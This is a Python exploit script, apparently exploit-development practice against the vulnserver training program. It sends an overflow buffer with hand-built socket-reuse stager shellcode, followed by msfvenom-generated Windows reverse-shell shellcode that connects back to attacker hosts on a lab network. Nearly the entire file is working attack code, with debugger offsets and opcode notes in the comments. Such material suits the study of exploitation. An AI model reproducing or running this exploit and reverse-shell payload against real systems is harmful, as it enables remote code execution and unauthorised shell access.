
#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit
from time import sleep

# CONSTANTS
rhost = "192.168.29.201"
rport = 4321
target = (rhost, rport)
timeout_val = 10  # seconds


#00B6FA0C   0000007C  |...  |Socket = 7C
#00401953  |. E8 D40B0000    |CALL <JMP.&WS2_32.recv>                 ; \recv
#CALL 0040252C


#EIP is at 00B6FA0C when initial stop at breakpoint
#closest address of file descriptor?
#

#00B6F78F   007C00 00        ADD BYTE PTR DS:[EAX+EAX],BH
#00B6FB93   007C00 00        ADD BYTE PTR DS:[EAX+EAX],BH


#Enter Address #1: 00B6FA0C
#Enter Address #2: 00B6F78F
#[+] Hex offset: 0x27d
#[+] Decimal offset: 637

#Enter Address #1: 00B6FA0C
#Enter Address #2: 00B6FB93
#[+] Hex offset: 0x187
#[+] Decimal offset: 391

#00B6F9C6   54               PUSH ESP
#00B6F9C7   59               POP ECX
#00B6F9C8   66:81C1 8701     ADD CX,187


exploit = b"HELP "
#exploit += b"\x90" * 7
exploit += b"\x90" * 3
exploit += b"\x40\x23\xA0\x90"
exploit += b"\x90\xA0\x23\x40"
##0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB 90A02340      MOV EBX,4023A090
#0022FBB3   C1EB 08          SHR EBX,8
#0022FBB6   FFD3             CALL EBX


#exploit += b"\x90" * 3

 #   b"\x54"  # PUSH ESP
  #  b"\x59"  # POP ECX
   # b"\x66\x81\xC1\x87\x01"  # ADD CX,187
#)
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
#exploit += b"\x90" * (66 - len(exploit))

#exploit = b"A" * 66
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
# \\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll
#exploit += pack("<L", 0x7c82385d)
#exploit += pack("<L", 0x7c82385d)
#exploit += b'\x5d\x38\x82\x7c'
#7C82385D
exploit += b'\x5D\x38\x82\x7C'

# 00B7FA0C  ^EB B8            JMP SHORT 00B7F9C6
# JMP -72 (decimal) bytes

#exploit = (
 #   b"\x54"                     # PUSH ESP
  #  b"\x59"                     # POP ECX
   # b"\x66\x81\xC1\x87\x01"     # ADD CX,187
    #b"\x33\xD2"                 # XOR EDX,EDX
  #  b"\x52"                     # PUSH EDX 
    #b"\x80\xC6\x02"             # ADD DH,2
    #b"\x52"                     # PUSH EDX
   # b"\x54"                     # PUSH ESP
   # b"\x5A"                     # POP EDX
   # b"\x80\xEA\x2A"             # SUB DL,2A
   # b"\x52"                     # PUSH EDX
  #  b"\xFF\x31"                 # PUSH DWORD PTR DS:[ECX]
  #  b"\xE8\x4B\x2B\x88\xFF"     # CALL <JMP.&WS2_32.recv>
#)
#exploit += b"\B" * 4
#payload = []

#exploit += b"\x90" * 2

payload = (



   # b"\x54\x59"

#    b"\x81\xC1"

  #  b"\x0D\x02"


   # b"\x54"  # PUSH ESP
    #b"\x58"  # POP EAX
#    b"\x66\x81\xC1\x0D\x02"  # ADD AX,187
    #b"\x66\x05\x0D\x02"  # ADD AX,0x20d

#so these lines push the  socket descriptor to eax register


   b"\x83\xEC\x64" #SUB ESP,64
#moves stack pointer back so we don't overwrite it - who the fuck knows why or how
#0022FBB1   83EC 64          SUB ESP,64

#    b"\x90\x90"

 #   b"\x90\x90"

  #  b"\x90\x90"
    b"\x54"
    b"\x59"
    b"\x66\x81\xC1\x74\x02"

#push esp
#POP ecx
#add cx,271
#this is to add value of socket descriptor to stack

#PUSH DWORD PTR DS:[ECX] 

#root@kali:~/tools/CTP-OSCE/Offset# python offset.py 
#Enter Address #1: 22FB38
#Enter Address #2: 0022FDA9
#[+] Hex offset: 0x271
#[+] Decimal offset: 625



   b"\x33\xDB" #XOR EBX,EBX
#0022FBB4   33DB             
#sets flags to 0

   b"\x53" # PUSH EBX
#0022FBB6   53     

#puts it back on the stack        

   b"\x80\xC7\x04" #ADD BH,4
   b"\x53" # PUSH EBX

 #  b"\xFF\xD0" # PUSH EBX
# BUFFER SIZE AND PUTS IT ON STACK









#BUFFER LOCAITON HERE BELOW:

#0022FBC7   90               NOP

#0022FBC7
#0022FBC7

#XOR EBX, EBX
#MOV EBX, 22FBC709
#SHR  EBX, 8
#PUSH EBX

#0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB 09C7FB22      MOV EBX,22FBC709
#0022FBB3   C1EB 08          SHR EBX,8
#0022FBB6   53               PUSH EBX

#this is adding buffer location to 
    b"\x33\xDB"


    b"\xBB\x09\xC6\xFB\x22"
    b"\xC1\xEB\x08"
    b"\x53"
#    b"\x33\xDB"

   # b"\x90\x90\x90\x90\x90\x90\x90\x90"




   # b"\x90\x90\x90\x90\x90\x90\x90\x90"
    #b"\x33\xDB"
  #  b"\xBB\xC6\xFB\x22\x00"
   # b"\x53"



#0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB C6FB2200      MOV EBX,22FBC6
#0022FBB3   53               PUSH EBX

#0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB C6FB2200      MOV EBX,22FBC6
#0022FBB3   53               PUSH EBX


#HERE IS WHERE YOU NEED TO REPLACE IT 
#
#IT IS EITHER:
#0022E551
#0022FAE1
#0022FDA9

#FROM:




  #  b"\x90\x90"

  #  b"\x90\x90"
 #   b"\x33\xDB"
# 33DB             XOR EBX,EBX
   # b"\x33\xC0"
#0022FBAC   33C0             XOR EAX,EAX
#zeros eax
 #   b"\x80\xc3\x84"

 #   b"\x04\x52"



#0022E551
#
 #   b"\x04\x52"
#0022FBAE   04 84            ADD AL,52
  #  b"\x50"
  #  b"\x53"

##### okayyy, this is the value, if this is not correct, 
#the value may need to be 0x52 
#may need to be 84, but fairly sure stack is hex

# THIS IS FOR SOCKET SIZE BTW




   # b"\x90\x90\x90\x90\x90\x90\x90\x90"
   # b"\x90\x90\x90\x90\x90\x90\x90\x90"

    b"\x33\xDB"
    b"\xBB\x90\xA0\x23\x40"
    b"\xC1\xEB\x08"
    b"\xFF\x31"#PUSH DWORD PTR DS:[ECX] 

    b"\xFF\xD3"
#NEW CALL NEW CALL

#new call
#0022FBAC   33DB             XOR EBX,EBX
#0022FBAE   BB 90A02340      MOV EBX,4023A090
#0022FBB3   C1EB 08          SHR EBX,8
#0022FBB6   FFD3             CALL EBX



#0022FBBC   33DB             XOR EBX,EBX
#0022FBBE   BB 90A02340      MOV EBX,4023A090
#0022FBC3   C1EB 08          SHR EBX,8
#0022FBC6   FFD3             CALL EBX





 #   b"\xE8\xE7\x27\x1D\x00"
#0022FBB4   E8 E7271D00      CALL <JMP.&WS2_32.recv>
#this is the call, add back later

#0022FBB1   E8 EA271D00      CALL <JMP.&WS2_32.recv>




#   b"\x54" #
 #  b"\x5B" #
  # b"\x81\xC3\x97\x00\x00\x00" #
   #b"\x53"

#0022FBB2   54               PUSH ESP
#0022FBB3   5B               POP EBX
#0022FBB4   81C3 97000000    ADD EBX,97
#0022FBBA   53               PUSH EBX




#0022FBB3   54               PUSH ESP
#0022FBB4   5B               POP EBX
#0022FBB5   81C3 96000000    ADD EBX,96
#0022FBBB   53               PUSH EBX

   # b"\x54\x58\x04\x4b\x04\x4b\x50\x5c"


#Enter Address #1: 0022FB30
#Enter Address #2: 0022FBC6
#[+] Hex offset: 0x96
#[+] Decimal offset: 150
#[-] ESP Sub Adjust Opcodes: \x54\x58\x2c\x4b\x2c\x4b\x50\x5c
#[+] ESP Add Adjust Opcodes: \x54\x58\x04\x4b\x04\x4b\x50\x5c



  #  b"\xFF\x30"
 #   b"\xFF\x00"

)
#0022FBA2   66:81C1 2505     ADD CX,525


#EXPLOIT PAYLOAD GOES HERE


#exploit += payload
#42 appears t
exploit += payload
exploit += b"\x90" * (42 - len(payload))
#exploit += b"\xCC" * (2 - len(payload))
exploit += b"(" 


print(exploit)

#CALL 0040252C

#payload = b"KSTET /.:/"
#payload += exploit



# Payload generated with: msfvenom -p windows/shell_reverse_tcp LHOST=10.2.0.130 LPORT=4444 -f python -v payload


#secondstage = (
 #   b"\xCC" * 512

  #)






secondstageone = (
    b"\xCC" * 512

  )




secondstage = (
b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"                                   
b"\xde\x88\x96\xc5\x83\xee\xfc\xe2\xf4\x22\x60\x14\xc5\xde\x88"                                   
b"\xf6\x4c\x3b\xb9\x56\xa1\x55\xd8\xa6\x4e\x8c\x84\x1d\x97\xca"                                   
b"\x03\xe4\xed\xd1\x3f\xdc\xe3\xef\x77\x3a\xf9\xbf\xf4\x94\xe9"                                   
b"\xfe\x49\x59\xc8\xdf\x4f\x74\x37\x8c\xdf\x1d\x97\xce\x03\xdc"                                   
b"\xf9\x55\xc4\x87\xbd\x3d\xc0\x97\x14\x8f\x03\xcf\xe5\xdf\x5b"                                   
b"\x1d\x8c\xc6\x6b\xac\x8c\x55\xbc\x1d\xc4\x08\xb9\x69\x69\x1f"                                   
b"\x47\x9b\xc4\x19\xb0\x76\xb0\x28\x8b\xeb\x3d\xe5\xf5\xb2\xb0"                                   
b"\x3a\xd0\x1d\x9d\xfa\x89\x45\xa3\x55\x84\xdd\x4e\x86\x94\x97"                                   
b"\x16\x55\x8c\x1d\xc4\x0e\x01\xd2\xe1\xfa\xd3\xcd\xa4\x87\xd2"
b"\xc7\x3a\x3e\xd7\xc9\x9f\x55\x9a\x7d\x48\x83\xe0\xa5\xf7\xde"
b"\x88\xfe\xb2\xad\xba\xc9\x91\xb6\xc4\xe1\xe3\xd9\x77\x43\x7d"
b"\x4e\x89\x96\xc5\xf7\x4c\xc2\x95\xb6\xa1\x16\xae\xde\x77\x43"
b"\x95\x8e\xd8\xc6\x85\x8e\xc8\xc6\xad\x34\x87\x49\x25\x21\x5d"
b"\x01\xaf\xdb\xe0\x9c\xcf\xd5\x8b\xfe\xc7\xde\x8d\xaf\x4c\x38"
b"\xe2\x86\x93\x89\xe0\x0f\x60\xaa\xe9\x69\x10\x5b\x48\xe2\xc9"
b"\x21\xc6\x9e\xb0\x32\xe0\x66\x70\x7c\xde\x69\x10\xb6\xeb\xfb"
b"\xa1\xde\x01\x75\x92\x89\xdf\xa7\x33\xb4\x9a\xcf\x93\x3c\x75"
b"\xf0\x02\x9a\xac\xaa\xc4\xdf\x05\xd2\xe1\xce\x4e\x96\x81\x8a"
b"\xd8\xc0\x93\x88\xce\xc0\x8b\x88\xde\xc5\x93\xb6\xf1\x5a\xfa"
b"\x58\x77\x43\x4c\x3e\xc6\xc0\x83\x21\xb8\xfe\xcd\x59\x95\xf6"
b"\x3a\x0b\x33\x66\x70\x7c\xde\xfe\x63\x4b\x35\x0b\x3a\x0b\xb4"
b"\x90\xb9\xd4\x08\x6d\x25\xab\x8d\x2d\x82\xcd\xfa\xf9\xaf\xde"
b"\xdb\x69\x10"
  )



#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.10 LPORT=1337 -f python -v payload

secondstage = (
b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"                                   
b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"                                   
b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"                                   
b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"                                   
b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"                                   
b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"                                   
b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"                                   
b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"                                   
b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"                                   
b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
b"\x1d\x0a\x68\x02\x00\x05\x39\x89\xe6\x6a\x10\x56"
b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

)


#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.11.3 LPORT=1337 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"
##msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.11.3 LPORT=1337 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"

secondstage = (

b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
b"\x1d\x0a\x68\x02\x00\x05\x39\x89\xe6\x6a\x10\x56"
b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"


)
secondstage = (

b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
b"\x81\x76\x0e\x63\xaa\xc7\x9c\x83\xee\xfc\xe2\xf4"
b"\x9f\x42\x45\x9c\x63\xaa\xa7\x15\x86\x9b\x07\xf8"
b"\xe8\xfa\xf7\x17\x31\xa6\x4c\xce\x77\x21\xb5\xb4"
b"\x6c\x1d\x8d\xba\x52\x55\x6b\xa0\x02\xd6\xc5\xb0"
b"\x43\x6b\x08\x91\x62\x6d\x25\x6e\x31\xfd\x4c\xce"
b"\x73\x21\x8d\xa0\xe8\xe6\xd6\xe4\x80\xe2\xc6\x4d"
b"\x32\x21\x9e\xbc\x62\x79\x4c\xd5\x7b\x49\xfd\xd5"
b"\xe8\x9e\x4c\x9d\xb5\x9b\x38\x30\xa2\x65\xca\x9d"
b"\xa4\x92\x27\xe9\x95\xa9\xba\x64\x58\xd7\xe3\xe9"
b"\x87\xf2\x4c\xc4\x47\xab\x14\xfa\xe8\xa6\x8c\x17"
b"\x3b\xb6\xc6\x4f\xe8\xae\x4c\x9d\xb3\x23\x83\xb8"
b"\x47\xf1\x9c\xfd\x3a\xf0\x96\x63\x83\xf5\x98\xc6"
b"\xe8\xb8\x2c\x11\x3e\xc2\xf4\xae\x63\xaa\xaf\xeb"
b"\x10\x98\x98\xc8\x0b\xe6\xb0\xba\x64\x55\x12\x24"
b"\xf3\xab\xc7\x9c\x4a\x6e\x93\xcc\x0b\x83\x47\xf7"
b"\x63\x55\x12\xcc\x33\xfa\x97\xdc\x33\xea\x97\xf4"
b"\x89\xa5\x18\x7c\x9c\x7f\x50\xf6\x66\xc2\x07\x34"
b"\x7e\xa0\xaf\x9e\x63\xaf\xfe\x15\x85\xc0\xd7\xca"
b"\x34\xc2\x5e\x39\x17\xcb\x38\x49\xe6\x6a\xb3\x90"
b"\x9c\xe4\xcf\xe9\x8f\xc2\x37\x29\xc1\xfc\x38\x49"
b"\x0b\xc9\xaa\xf8\x63\x23\x24\xcb\x34\xfd\xf6\x6a"
b"\x09\xb8\x9e\xca\x81\x57\xa1\x5b\x27\x8e\xfb\x9d"
b"\x62\x27\x83\xb8\x73\x6c\xc7\xd8\x37\xfa\x91\xca"
b"\x35\xec\x91\xd2\x35\xfc\x94\xca\x0b\xd3\x0b\xa3"
b"\xe5\x55\x12\x15\x83\xe4\x91\xda\x9c\x9a\xaf\x94"
b"\xe4\xb7\xa7\x63\xb6\x11\x37\x29\xc1\xfc\xaf\x3a"
b"\xf6\x17\x5a\x63\xb6\x96\xc1\xe0\x69\x2a\x3c\x7c"
b"\x16\xaf\x7c\xdb\x70\xd8\xa8\xf6\x63\xf9\x38\x49"


)

secondstage = (
b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
b"\x1d\x0a\x68\x02\x00\x05\x39\x89\xe6\x6a\x10\x56"
b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
)


secondstage = (
b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"                                   
b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"                                   
b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"                                   
b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"                                   
b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"                                   
b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"                                   
b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"                                   
b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"                                   
b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"                                   
b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
b"\x1d\x0a\x68\x02\x00\x05\x39\x89\xe6\x6a\x10\x56"
b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

)
if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        s.recv(1024)
        print('[*] sending exploit')
        s.send(exploit)
        print('[*] sending out payload value')
 #       sleep(1)
        #sleep(500)
        sleep(10)
       # s.send(b"\xCC" * 512)
        s.send(secondstage)
      #  s.send(secondstage)

        print('[*] cleaning up')
       # s.close()
    except timeout:
        print('[!] socket timeout occurred, have you tried:')
        print('\t* ensure the debugger is not in a paused state')
        print('\t* checking if the VM is connected to the right virt network?')
        exit(1)
        s.close()
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)
    except KeyboardInterrupt:
        print()  # drop us below the ^C
        print('[!] user initiated cancel, exiting...')
        exit(1)